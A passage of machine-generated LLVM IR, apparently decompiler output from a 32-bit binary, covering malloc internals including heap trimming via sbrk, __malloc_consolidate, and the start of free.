  %v1_80602b2 = add i32 %v3_80602af, 4
  %v2_80602b2 = inttoptr i32 %v1_80602b2 to i32*
  %v3_80602b2 = load i32, i32* %v2_80602b2, align 4
  %v1_80602b5 = and i32 %v3_80602b2, -4
  store i32 %v1_80602b5, i32* @esi, align 4
  %v1_80602ba = load i32, i32* @eax, align 4
  %v2_80602ba = add i32 %v3_80602a9, -17
  %v2_80602bc = add i32 %v2_80602ba, %v1_80602b5
  %v3_80602bc = sub i32 %v2_80602bc, %v1_80602ba
  %div = udiv i32 %v3_80602bc, %v3_80602a9
  store i32 %div, i32* %eax.global-to-local, align 4
  %v1_80602c4 = add i32 %div, -1
  %v4_80602c7 = mul i32 %v1_80602c4, %v3_80602a9
  store i32 %v4_80602c7, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_80602c7, 1
  br i1 %tmp11, label %dec_label_pc_8060323, label %dec_label_pc_80602ce

dec_label_pc_80602ce:                             ; preds = %entry
  %v1_80602d3 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80602d3, i32* %edi.global-to-local, align 4
  %v0_80602dd = load i32, i32* @esi, align 4
  store i32 %v0_80602dd, i32* %eax.global-to-local, align 4
  %v1_80602df = load i32, i32* %ebp.global-to-local, align 4
  %v2_80602df = add i32 %v1_80602df, 44
  %v3_80602df = inttoptr i32 %v2_80602df to i32*
  %v4_80602df = load i32, i32* %v3_80602df, align 4
  %v5_80602df = add i32 %v4_80602df, %v0_80602dd
  store i32 %v5_80602df, i32* %eax.global-to-local, align 4
  %v12_80602e2 = icmp eq i32 %v1_80602d3, %v5_80602df
  %v1_80602e4 = icmp eq i1 %v12_80602e2, false
  br i1 %v1_80602e4, label %dec_label_pc_8060323, label %dec_label_pc_80602e6

dec_label_pc_80602e6:                             ; preds = %dec_label_pc_80602ce
  %v1_80602e9 = sub i32 0, %v4_80602c7
  store i32 %v1_80602e9, i32* @ebx, align 4
  %v1_80602ec = call i32 @__GI_sbrk(i32 %v1_80602e9)
  store i32 %v1_80602ec, i32* %eax.global-to-local, align 4
  %v1_80602f8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80602f8, i32* %eax.global-to-local, align 4
  %v10_8060300 = icmp eq i32 %v1_80602f8, -1
  br i1 %v10_8060300, label %dec_label_pc_8060323, label %dec_label_pc_8060305

dec_label_pc_8060305:                             ; preds = %dec_label_pc_80602e6
  %v0_8060305 = load i32, i32* %edi.global-to-local, align 4
  %v2_8060307 = sub i32 %v0_8060305, %v1_80602f8
  %v12_8060307 = icmp eq i32 %v2_8060307, 0
  store i32 %v2_8060307, i32* @ecx, align 4
  br i1 %v12_8060307, label %dec_label_pc_8060323, label %dec_label_pc_806030b

dec_label_pc_806030b:                             ; preds = %dec_label_pc_8060305
  %v0_806030b = load i32, i32* %ebp.global-to-local, align 4
  %v1_806030b = add i32 %v0_806030b, 44
  %v2_806030b = inttoptr i32 %v1_806030b to i32*
  %v3_806030b = load i32, i32* %v2_806030b, align 4
  store i32 %v3_806030b, i32* %eax.global-to-local, align 4
  %v0_806030e = load i32, i32* @esi, align 4
  %v2_806030e = sub i32 %v0_806030e, %v2_8060307
  store i32 %v2_806030e, i32* %esi.global-to-local, align 4
  %v1_8060310 = add i32 %v0_806030b, 872
  %v2_8060310 = inttoptr i32 %v1_8060310 to i32*
  %v3_8060310 = load i32, i32* %v2_8060310, align 4
  %v5_8060310 = sub i32 %v3_8060310, %v2_8060307
  store i32 %v5_8060310, i32* %v2_8060310, align 4
  %v0_8060316 = load i32, i32* %esi.global-to-local, align 4
  %v1_8060316 = or i32 %v0_8060316, 1
  store i32 %v1_8060316, i32* %esi.global-to-local, align 4
  %v1_8060319 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060319 = add i32 %v1_8060319, 4
  %v3_8060319 = inttoptr i32 %v2_8060319 to i32*
  store i32 %v1_8060316, i32* %v3_8060319, align 4
  br label %dec_label_pc_8060325

dec_label_pc_8060323:                             ; preds = %dec_label_pc_8060305, %dec_label_pc_80602e6, %dec_label_pc_80602ce, %entry
  br label %dec_label_pc_8060325

dec_label_pc_8060325:                             ; preds = %dec_label_pc_806030b, %dec_label_pc_8060323
  %storemerge = phi i32 [ 1, %dec_label_pc_806030b ], [ 0, %dec_label_pc_8060323 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80602a5, i32* @ebx, align 4
  store i32 %v0_80602a4, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80602f8, { 1, 0, 2 }
  uselistorder i32 %v4_80602c7, { 1, 2, 0 }
  uselistorder i32 %v3_80602a9, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80602a1, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_8060325, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_806032d = load i32, i32* @ebp, align 4
  %v0_806032e = load i32, i32* @edi, align 4
  %v0_806032f = load i32, i32* @esi, align 4
  %v0_8060330 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8060338 = load i32, i32* %arg1, align 4
  store i32 %v2_8060338, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_806033f = icmp eq i32 %v2_8060338, 0
  br i1 %v1_806033f, label %dec_label_pc_8060468.preheader, label %dec_label_pc_8060347

dec_label_pc_8060468.preheader:                   ; preds = %entry
  %v3_806045d = add i32 %tmp11, 44
  br label %dec_label_pc_8060459

dec_label_pc_8060347:                             ; preds = %entry
  %v1_806034b = and i32 %v2_8060338, -3
  store i32 %v1_806034b, i32* %arg1, align 4
  %v1_8060350 = add i32 %tmp11, 52
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_806036c = udiv i32 %v1_806034b, 8
  %v2_806036f = mul nuw i32 %v2_806036c, 4
  %v3_806036f = add i32 %tmp11, -4
  %v4_806036f = add i32 %v3_806036f, %v2_806036f
  store i32 %v4_806036f, i32* %eax.global-to-local, align 4
  %v2_8060436 = add i32 %tmp11, 44
  %v3_8060436 = inttoptr i32 %v2_8060436 to i32*
  %v1_8060409 = add i32 %tmp11, 60
  %v2_8060409 = inttoptr i32 %v1_8060409 to i32*
  br label %dec_label_pc_8060377

dec_label_pc_8060377:                             ; preds = %dec_label_pc_806044f, %dec_label_pc_8060347
  %v0_8060385.in = phi i32 [ %tmp11, %dec_label_pc_8060347 ], [ %v0_8060385, %dec_label_pc_806044f ]
  %v0_8060385 = add i32 %v0_8060385.in, 4
  store i32 %v0_8060385, i32* %eax.global-to-local, align 4
  %v1_806037b = inttoptr i32 %v0_8060385 to i32*
  %v2_806037b = load i32, i32* %v1_806037b, align 4
  store i32 %v2_806037b, i32* @ecx, align 4
  %v1_806037d = icmp eq i32 %v2_806037b, 0
  br i1 %v1_806037d, label %dec_label_pc_8060445, label %dec_label_pc_8060385

dec_label_pc_8060385:                             ; preds = %dec_label_pc_8060377
  store i32 0, i32* %v1_806037b, align 4
  %v0_806038b.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_806038b

dec_label_pc_806038b:                             ; preds = %dec_label_pc_8060439, %dec_label_pc_8060385
  %v0_80603a8 = phi i32 [ %v3_806038b, %dec_label_pc_8060439 ], [ %v0_806038b.pre, %dec_label_pc_8060385 ]
  %v1_806038b = add i32 %v0_80603a8, 8
  %v2_806038b = inttoptr i32 %v1_806038b to i32*
  %v3_806038b = load i32, i32* %v2_806038b, align 4
  store i32 %v3_806038b, i32* %edx.global-to-local, align 4
  %v1_8060392 = add i32 %v0_80603a8, 4
  %v2_8060392 = inttoptr i32 %v1_8060392 to i32*
  %v3_8060392 = load i32, i32* %v2_8060392, align 4
  store i32 %v3_8060392, i32* %eax.global-to-local, align 4
  %v1_8060397 = and i32 %v3_8060392, -2
  store i32 %v1_8060397, i32* @edi, align 4
  %v2_806039a = urem i32 %v3_8060392, 2
  %v3_806039a = icmp eq i32 %v2_806039a, 0
  %v2_806039c = add i32 %v1_8060397, %v0_80603a8
  store i32 %v2_806039c, i32* @ebx, align 4
  %v1_806039f = add i32 %v2_806039c, 4
  %v2_806039f = inttoptr i32 %v1_806039f to i32*
  %v3_806039f = load i32, i32* %v2_806039f, align 4
  store i32 %v3_806039f, i32* %edx.global-to-local, align 4
  %v1_80603a6 = icmp eq i1 %v3_806039a, false
  br i1 %v1_80603a6, label %dec_label_pc_80603c8, label %dec_label_pc_80603a8

dec_label_pc_80603a8:                             ; preds = %dec_label_pc_806038b
  %v1_80603a8 = inttoptr i32 %v0_80603a8 to i32*
  %v2_80603a8 = load i32, i32* %v1_80603a8, align 4
  store i32 %v2_80603a8, i32* @ebp, align 4
  %v2_80603ac = sub i32 %v0_80603a8, %v2_80603a8
  store i32 %v2_80603ac, i32* %eax.global-to-local, align 4
  %v1_80603ae = add i32 %v2_80603ac, 8
  %v2_80603ae = inttoptr i32 %v1_80603ae to i32*
  %v3_80603ae = load i32, i32* %v2_80603ae, align 4
  store i32 %v3_80603ae, i32* @esi, align 4
  %v1_80603b1 = add i32 %v2_80603ac, 12
  %v2_80603b1 = inttoptr i32 %v1_80603b1 to i32*
  %v3_80603b1 = load i32, i32* %v2_80603b1, align 4
  store i32 %v3_80603b1, i32* %edx.global-to-local, align 4
  %v1_80603b4 = add i32 %v3_80603ae, 12
  %v2_80603b4 = inttoptr i32 %v1_80603b4 to i32*
  %v3_80603b4 = load i32, i32* %v2_80603b4, align 4
  store i32 %v3_80603b4, i32* @ecx, align 4
  %v12_80603b7 = icmp eq i32 %v3_80603b4, %v2_80603ac
  %v1_80603b9 = icmp eq i1 %v12_80603b7, false
  br i1 %v1_80603b9, label %dec_label_pc_80603f8, label %dec_label_pc_80603bb

dec_label_pc_80603bb:                             ; preds = %dec_label_pc_80603a8
  %v1_80603bb = add i32 %v3_80603b1, 8
  %v2_80603bb = inttoptr i32 %v1_80603bb to i32*
  %v3_80603bb = load i32, i32* %v2_80603bb, align 4
  %v15_80603bb = icmp eq i32 %v3_80603bb, %v3_80603b4
  %v1_80603be = icmp eq i1 %v15_80603bb, false
  br i1 %v1_80603be, label %dec_label_pc_80603f8, label %dec_label_pc_80603c0

dec_label_pc_80603c0:                             ; preds = %dec_label_pc_80603bb
  %v2_80603c0 = add i32 %v2_80603a8, %v1_8060397
  store i32 %v2_80603c0, i32* @edi, align 4
  store i32 %v3_80603b1, i32* %v2_80603b4, align 4
  %v0_80603c5 = load i32, i32* @esi, align 4
  %v1_80603c5 = load i32, i32* %edx.global-to-local, align 4
  %v2_80603c5 = add i32 %v1_80603c5, 8
  %v3_80603c5 = inttoptr i32 %v2_80603c5 to i32*
  store i32 %v0_80603c5, i32* %v3_80603c5, align 4
  %v0_80603d3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80603c8

dec_label_pc_80603c8:                             ; preds = %dec_label_pc_806038b, %dec_label_pc_80603c0
  %v1_80603dc = phi i32 [ %v2_806039c, %dec_label_pc_806038b ], [ %v0_80603d3.pre, %dec_label_pc_80603c0 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_80603d0 = and i32 %v3_806039f, -4
  store i32 %v1_80603d0, i32* @ebp, align 4
  %v4_80603d3 = load i32, i32* %v3_8060436, align 4
  %v15_80603d3 = icmp eq i32 %v1_80603dc, %v4_80603d3
  br i1 %v15_80603d3, label %dec_label_pc_8060429, label %dec_label_pc_80603d8

dec_label_pc_80603d8:                             ; preds = %dec_label_pc_80603c8
  %v2_80603d8 = add i32 %v1_80603dc, 4
  %v3_80603d8 = add i32 %v2_80603d8, %v1_80603d0
  %v4_80603d8 = inttoptr i32 %v3_80603d8 to i32*
  %v5_80603d8 = load i32, i32* %v4_80603d8, align 4
  store i32 %v5_80603d8, i32* %eax.global-to-local, align 4
  %v3_80603dc = inttoptr i32 %v2_80603d8 to i32*
  store i32 %v1_80603d0, i32* %v3_80603dc, align 4
  %v0_80603df = load i32, i32* %eax.global-to-local, align 4
  %v1_80603df = urem i32 %v0_80603df, 2
  %v2_80603df = icmp eq i32 %v1_80603df, 0
  store i32 %v1_80603df, i32* %eax.global-to-local, align 4
  %v1_80603e4 = icmp eq i1 %v2_80603df, false
  br i1 %v1_80603e4, label %dec_label_pc_8060405, label %dec_label_pc_80603e6

dec_label_pc_80603e6:                             ; preds = %dec_label_pc_80603d8
  %v0_80603e6 = load i32, i32* @ebx, align 4
  %v1_80603e6 = add i32 %v0_80603e6, 8
  %v2_80603e6 = inttoptr i32 %v1_80603e6 to i32*
  %v3_80603e6 = load i32, i32* %v2_80603e6, align 4
  store i32 %v3_80603e6, i32* @edx, align 4
  %v1_80603e9 = add i32 %v0_80603e6, 12
  %v2_80603e9 = inttoptr i32 %v1_80603e9 to i32*
  %v3_80603e9 = load i32, i32* %v2_80603e9, align 4
  store i32 %v3_80603e9, i32* %eax.global-to-local, align 4
  %v1_80603ec = add i32 %v3_80603e6, 12
  %v2_80603ec = inttoptr i32 %v1_80603ec to i32*
  %v3_80603ec = load i32, i32* %v2_80603ec, align 4
  store i32 %v3_80603ec, i32* @esi, align 4
  %v12_80603ef = icmp eq i32 %v3_80603ec, %v0_80603e6
  %v1_80603f1 = icmp eq i1 %v12_80603ef, false
  br i1 %v1_80603f1, label %dec_label_pc_80603f8, label %dec_label_pc_80603f3

dec_label_pc_80603f3:                             ; preds = %dec_label_pc_80603e6
  %v1_80603f3 = add i32 %v3_80603e9, 8
  %v2_80603f3 = inttoptr i32 %v1_80603f3 to i32*
  %v3_80603f3 = load i32, i32* %v2_80603f3, align 4
  %v15_80603f3 = icmp eq i32 %v3_80603f3, %v3_80603ec
  br i1 %v15_80603f3, label %dec_label_pc_80603fd, label %dec_label_pc_80603f8

dec_label_pc_80603f8:                             ; preds = %dec_label_pc_80603f3, %dec_label_pc_80603e6, %dec_label_pc_80603bb, %dec_label_pc_80603a8
  %v0_80603f8 = call i32 @abort()
  store i32 %v0_80603f8, i32* %eax.global-to-local, align 4
  %v1_80603ff.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80603fd

dec_label_pc_80603fd:                             ; preds = %dec_label_pc_80603f3, %dec_label_pc_80603f8
  %v1_80603ff = phi i32 [ %v3_80603e6, %dec_label_pc_80603f3 ], [ %v1_80603ff.pre, %dec_label_pc_80603f8 ]
  %v0_80603ff = phi i32 [ %v3_80603e9, %dec_label_pc_80603f3 ], [ %v0_80603f8, %dec_label_pc_80603f8 ]
  %v0_80603fd = load i32, i32* @edi, align 4
  %v1_80603fd = load i32, i32* @ebp, align 4
  %v2_80603fd = add i32 %v1_80603fd, %v0_80603fd
  store i32 %v2_80603fd, i32* @edi, align 4
  %v2_80603ff = add i32 %v1_80603ff, 12
  %v3_80603ff = inttoptr i32 %v2_80603ff to i32*
  store i32 %v0_80603ff, i32* %v3_80603ff, align 4
  %v0_8060402 = load i32, i32* @edx, align 4
  %v1_8060402 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060402 = add i32 %v1_8060402, 8
  %v3_8060402 = inttoptr i32 %v2_8060402 to i32*
  store i32 %v0_8060402, i32* %v3_8060402, align 4
  br label %dec_label_pc_8060405

dec_label_pc_8060405:                             ; preds = %dec_label_pc_80603d8, %dec_label_pc_80603fd
  store i32 %v1_8060350, i32* %eax.global-to-local, align 4
  %v3_8060409 = load i32, i32* %v2_8060409, align 4
  store i32 %v3_8060409, i32* %edx.global-to-local, align 4
  %v0_806040c = load i32, i32* @ecx, align 4
  store i32 %v0_806040c, i32* %v2_8060409, align 4
  %v0_806040f = load i32, i32* @edi, align 4
  %v1_8060411 = or i32 %v0_806040f, 1
  %v1_8060414 = load i32, i32* @ecx, align 4
  %v2_8060414 = add i32 %v1_8060414, 4
  %v3_8060414 = inttoptr i32 %v2_8060414 to i32*
  store i32 %v1_8060411, i32* %v3_8060414, align 4
  %v0_8060417 = load i32, i32* @ecx, align 4
  %v1_8060417 = load i32, i32* %edx.global-to-local, align 4
  %v2_8060417 = add i32 %v1_8060417, 12
  %v3_8060417 = inttoptr i32 %v2_8060417 to i32*
  store i32 %v0_8060417, i32* %v3_8060417, align 4
  store i32 %v1_8060350, i32* %eax.global-to-local, align 4
  %v0_806041e = load i32, i32* %edx.global-to-local, align 4
  %v1_806041e = load i32, i32* @ecx, align 4
  %v2_806041e = add i32 %v1_806041e, 8
  %v3_806041e = inttoptr i32 %v2_806041e to i32*
  store i32 %v0_806041e, i32* %v3_806041e, align 4
  %v0_8060421 = load i32, i32* @edi, align 4
  %v1_8060421 = load i32, i32* @ecx, align 4
  %v3_8060421 = add i32 %v1_8060421, %v0_8060421
  %v4_8060421 = inttoptr i32 %v3_8060421 to i32*
  store i32 %v0_8060421, i32* %v4_8060421, align 4
  %v0_8060424 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060424 = load i32, i32* @ecx, align 4
  %v2_8060424 = add i32 %v1_8060424, 12
  %v3_8060424 = inttoptr i32 %v2_8060424 to i32*
  store i32 %v0_8060424, i32* %v3_8060424, align 4
  br label %dec_label_pc_8060439

dec_label_pc_8060429:                             ; preds = %dec_label_pc_80603c8
  %v0_8060429 = load i32, i32* @edi, align 4
  %v2_8060429 = add i32 %v0_8060429, %v1_80603d0
  %v1_806042c = or i32 %v2_8060429, 1
  store i32 %v1_806042c, i32* %eax.global-to-local, align 4
  %v1_806042f = load i32, i32* @ecx, align 4
  %v2_806042f = add i32 %v1_806042f, 4
  %v3_806042f = inttoptr i32 %v2_806042f to i32*
  store i32 %v1_806042c, i32* %v3_806042f, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v0_8060436 = load i32, i32* @ecx, align 4
  store i32 %v0_8060436, i32* %v3_8060436, align 4
  br label %dec_label_pc_8060439

dec_label_pc_8060439:                             ; preds = %dec_label_pc_8060405, %dec_label_pc_8060429
  store i32 %v3_806038b, i32* @ecx, align 4
  %v1_806043d = icmp eq i32 %v3_806038b, 0
  %v1_806043f = icmp eq i1 %v1_806043d, false
  br i1 %v1_806043f, label %dec_label_pc_806038b, label %dec_label_pc_8060445

dec_label_pc_8060445:                             ; preds = %dec_label_pc_8060439, %dec_label_pc_8060377
  store i32 %v4_806036f, i32* @ecx, align 4
  %v15_8060449 = icmp eq i32 %v0_8060385, %v4_806036f
  br i1 %v15_8060449, label %dec_label_pc_80604cd, label %dec_label_pc_806044f

dec_label_pc_806044f:                             ; preds = %dec_label_pc_8060445
  br label %dec_label_pc_8060377

dec_label_pc_8060459:                             ; preds = %dec_label_pc_8060468.preheader, %dec_label_pc_8060459
  %v1_806045d20 = phi i32 [ 1, %dec_label_pc_8060468.preheader ], [ %v0_8060468.pre, %dec_label_pc_8060459 ]
  %v2_806045d = mul i32 %v1_806045d20, 8
  %v4_806045d = add i32 %v3_806045d, %v2_806045d
  store i32 %v4_806045d, i32* %eax.global-to-local, align 4
  %v1_8060461 = add i32 %v1_806045d20, 1
  store i32 %v1_8060461, i32* %edx.global-to-local, align 4
  %v2_8060462 = add i32 %v4_806045d, 12
  %v3_8060462 = inttoptr i32 %v2_8060462 to i32*
  store i32 %v4_806045d, i32* %v3_8060462, align 4
  %v0_8060465 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060465 = add i32 %v0_8060465, 8
  %v3_8060465 = inttoptr i32 %v2_8060465 to i32*
  store i32 %v0_8060465, i32* %v3_8060465, align 4
  %v0_8060468.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_806046b = icmp sgt i32 %v0_8060468.pre, 95
  br i1 %v7_806046b, label %dec_label_pc_806046d, label %dec_label_pc_8060459

dec_label_pc_806046d:                             ; preds = %dec_label_pc_8060459
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8060471 = add i32 %tmp11, 864
  %v2_8060471 = inttoptr i32 %v1_8060471 to i32*
  %v3_8060471 = load i32, i32* %v2_8060471, align 4
  %v4_8060471 = or i32 %v3_8060471, 1
  store i32 %v4_8060471, i32* %v2_8060471, align 4
  %v0_8060478 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060478 = add i32 %v0_8060478, 840
  %v2_8060478 = inttoptr i32 %v1_8060478 to i32*
  store i32 0, i32* %v2_8060478, align 4
  %v0_8060482 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060482 = add i32 %v0_8060482, 852
  %v2_8060482 = inttoptr i32 %v1_8060482 to i32*
  store i32 65536, i32* %v2_8060482, align 4
  %v0_806048c = load i32, i32* %eax.global-to-local, align 4
  %v1_806048c = add i32 %v0_806048c, 844
  %v2_806048c = inttoptr i32 %v1_806048c to i32*
  store i32 262144, i32* %v2_806048c, align 4
  %v0_8060496 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060496 = add i32 %v0_8060496, 836
  %v2_8060496 = inttoptr i32 %v1_8060496 to i32*
  store i32 262144, i32* %v2_8060496, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_80604a7 = load i32, i32* %arg1, align 4
  %v1_80604a9 = urem i32 %v2_80604a7, 4
  %v1_80604ac = or i32 %v1_80604a9, 72
  store i32 %v1_80604ac, i32* %arg1, align 4
  %v1_80604b3 = add i32 %tmp11, 52
  store i32 %v1_80604b3, i32* %eax.global-to-local, align 4
  %v2_80604b6 = add i32 %tmp11, 44
  %v3_80604b6 = inttoptr i32 %v2_80604b6 to i32*
  store i32 %v1_80604b3, i32* %v3_80604b6, align 4
  %v1_80604bb = call i32 @sysconf(i32 30)
  store i32 %v1_80604bb, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_80604c7 = add i32 %tmp11, 860
  %v3_80604c7 = inttoptr i32 %v2_80604c7 to i32*
  store i32 %v1_80604bb, i32* %v3_80604c7, align 4
  br label %dec_label_pc_80604cd

dec_label_pc_80604cd:                             ; preds = %dec_label_pc_8060445, %dec_label_pc_806046d
  store i32 %v0_8060330, i32* @ebx, align 4
  store i32 %v0_806032f, i32* @esi, align 4
  store i32 %v0_806032e, i32* @edi, align 4
  store i32 %v0_806032d, i32* @ebp, align 4
  %v0_80604d4 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80604d4

; uselistorder directives
  uselistorder i32 %v0_8060465, { 1, 0 }
  uselistorder i32 %v0_8060421, { 1, 0 }
  uselistorder i32 %v1_80603df, { 1, 0 }
  uselistorder i32 %v2_80603d8, { 1, 0 }
  uselistorder i32 %v1_80603d0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80603dc, { 1, 0 }
  uselistorder i32 %v3_806038b, { 2, 1, 3, 0 }
  uselistorder i32 %v0_80603a8, { 2, 1, 0, 4, 3 }
  uselistorder i32* %v3_8060436, { 1, 0 }
  uselistorder i32 %tmp11, { 6, 16, 2, 1, 15, 13, 12, 10, 9, 0, 4, 11, 5, 8, 3, 14, 7 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_80604cd, { 1, 0 }
  uselistorder label %dec_label_pc_8060459, { 1, 0 }
  uselistorder label %dec_label_pc_8060439, { 1, 0 }
  uselistorder label %dec_label_pc_8060405, { 1, 0 }
  uselistorder label %dec_label_pc_80603fd, { 1, 0 }
  uselistorder label %dec_label_pc_80603c8, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80604d5 = load i32, i32* @ebp, align 4
  %v0_80604d6 = load i32, i32* @edi, align 4
  %v0_80604d7 = load i32, i32* @esi, align 4
  %v0_80604d8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80604e0 = icmp eq i32 %arg1, 0
  br i1 %v1_80604e0, label %dec_label_pc_8060669, label %dec_label_pc_80604e8

dec_label_pc_80604e8:                             ; preds = %entry
  %v2_80604f3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80604f3, i32* %eax.global-to-local, align 4
  %v4_80604f8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134586897, i32 ptrtoint (i32* @global_var_8074eb0.646 to i32))
  store i32 %v4_80604f8, i32* %eax.global-to-local, align 4
  %v1_8060504 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074eb0.646 to i32))
  %v1_8060509 = add i32 %arg1, -8
  store i32 %v1_8060509, i32* @ecx, align 4
  %v0_806050c = load i8, i8* @global_var_807f120.729, align 1
  %v1_806050c = sext i8 %v0_806050c to i32
  store i32 %v1_806050c, i32* %eax.global-to-local, align 4
  %v1_8060511 = add i32 %arg1, -4
  %v2_8060511 = inttoptr i32 %v1_8060511 to i32*
  %v3_8060511 = load i32, i32* %v2_8060511, align 4
  store i32 %v3_8060511, i32* %edx.global-to-local, align 4
  %v1_8060519 = and i32 %v3_8060511, -4
  %v4_8060519 = trunc i32 %v1_8060519 to i8
  store i32 %v1_8060519, i32* @ebx, align 4
  %v8_806051e = icmp ugt i8 %v4_8060519, %v0_806050c
  br i1 %v8_806051e, label %dec_label_pc_8060540, label %dec_label_pc_8060520

dec_label_pc_8060520:                             ; preds = %dec_label_pc_80604e8
  %v1_8060520 = or i32 %v1_806050c, 3
  %v3_8060520 = trunc i32 %v1_8060520 to i8
  store i32 %v1_8060520, i32* %eax.global-to-local, align 4
  %v2_8060523 = udiv i32 %v3_8060511, 8
  store i32 %v2_8060523, i32* @ebx, align 4
  store i8 %v3_8060520, i8* @global_var_807f120.729, align 32
  %v1_806052b = mul nuw i32 %v2_8060523, 4
  %v2_806052b = add i32 %v1_806052b, ptrtoint (i8* @global_var_807f120.729 to i32)
  store i32 %v2_806052b, i32* %edx.global-to-local, align 4
  %v1_8060532 = add i32 %v1_806052b, add (i32 ptrtoint (i8* @global_var_807f120.729 to i32), i32 -4)
  %v2_8060532 = inttoptr i32 %v1_8060532 to i32*
  %v3_8060532 = load i32, i32* %v2_8060532, align 4
  store i32 %v3_8060532, i32* %eax.global-to-local, align 4
  %v3_8060535 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8060532, i32* %v3_8060535, align 4
  %v0_8060538 = load i32, i32* @ecx, align 4
  %v1_8060538 = load i32, i32* %edx.global-to-local, align 4
  %v2_8060538 = add i32 %v1_8060538, -4
  %v3_8060538 = inttoptr i32 %v2_8060538 to i32*
  store i32 %v0_8060538, i32* %v3_8060538, align 4
  br label %dec_label_pc_8060658

dec_label_pc_8060540:                             ; preds = %dec_label_pc_80604e8
  %v2_8060540 = and i32 %v3_8060511, 2
  %v3_8060540 = icmp eq i32 %v2_8060540, 0
  %v1_8060543 = icmp eq i1 %v3_8060540, false
  br i1 %v1_8060543, label %dec_label_pc_8060638, label %dec_label_pc_8060549

dec_label_pc_8060549:                             ; preds = %dec_label_pc_8060540
  %v1_8060549 = or i32 %v1_806050c, 1
  %v3_8060549 = trunc i32 %v1_8060549 to i8
  store i32 %v1_8060549, i32* %eax.global-to-local, align 4
  store i8 %v3_8060549, i8* @global_var_807f120.729, align 32
  %v2_8060551 = add i32 %v1_8060519, %v1_8060509
  store i32 %v2_8060551, i32* @esi, align 4
  %v1_8060554 = add i32 %v2_8060551, 4
  %v2_8060554 = inttoptr i32 %v1_8060554 to i32*
  %v3_8060554 = load i32, i32* %v2_8060554, align 4
  store i32 %v3_8060554, i32* %eax.global-to-local, align 4
  %v2_806055b = inttoptr i32 %v1_8060511 to i8*
  %v3_806055b = load i8, i8* %v2_806055b, align 1
  %v4_806055b = urem i8 %v3_806055b, 2
  %v5_806055b = icmp eq i8 %v4_806055b, 0
  %v1_806055f = icmp eq i1 %v5_806055b, false
  br i1 %v1_806055f, label %dec_label_pc_8060582, label %dec_label_pc_8060561

dec_label_pc_8060561:                             ; preds = %dec_label_pc_8060549
  %v2_8060561 = inttoptr i32 %v1_8060509 to i32*
  %v3_8060561 = load i32, i32* %v2_8060561, align 4
  store i32 %v3_8060561, i32* @ebp, align 4
  %v2_8060566 = sub i32 %v1_8060509, %v3_8060561
  store i32 %v2_8060566, i32* %eax.global-to-local, align 4
  %v1_8060568 = add i32 %v2_8060566, 8
  %v2_8060568 = inttoptr i32 %v1_8060568 to i32*
  %v3_8060568 = load i32, i32* %v2_8060568, align 4
  store i32 %v3_8060568, i32* @edi, align 4
  %v1_806056b = add i32 %v2_8060566, 12
  %v2_806056b = inttoptr i32 %v1_806056b to i32*
  %v3_806056b = load i32, i32* %v2_806056b, align 4
  store i32 %v3_806056b, i32* %edx.global-to-local, align 4
  %v1_806056e = add i32 %v3_8060568, 12
  %v2_806056e = inttoptr i32 %v1_806056e to i32*
  %v3_806056e = load i32, i32* %v2_806056e, align 4
  store i32 %v3_806056e, i32* @ecx, align 4
  %v12_8060571 = icmp eq i32 %v3_806056e, %v2_8060566
  %v1_8060573 = icmp eq i1 %v12_8060571, false
  br i1 %v1_8060573, label %dec_label_pc_80605b1, label %dec_label_pc_8060575

dec_label_pc_8060575:                             ; preds = %dec_label_pc_8060561
  %v1_8060575 = add i32 %v3_806056b, 8
  %v2_8060575 = inttoptr i32 %v1_8060575 to i32*
  %v3_8060575 = load i32, i32* %v2_8060575, align 4
  %v15_8060575 = icmp eq i32 %v3_8060575, %v3_806056e
  %v1_8060578 = icmp eq i1 %v15_8060575, false
